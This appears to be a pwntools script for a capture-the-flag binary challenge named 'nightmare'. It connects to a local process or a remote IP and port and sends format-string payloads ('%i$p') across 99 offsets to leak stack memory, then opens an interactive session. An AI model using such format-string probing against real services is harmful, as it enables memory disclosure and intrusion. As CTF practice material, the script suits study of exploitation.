from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./nightmare_patched")

def start():
    if args.REMOTE:
        return remote("94.237.59.63", 56187)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

for i in range(1, 100):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b">> ", f"ABCD.%{i}$p".encode())
    print(f"[+] {i} : {io.recvline().decode()}")


io.interactive()
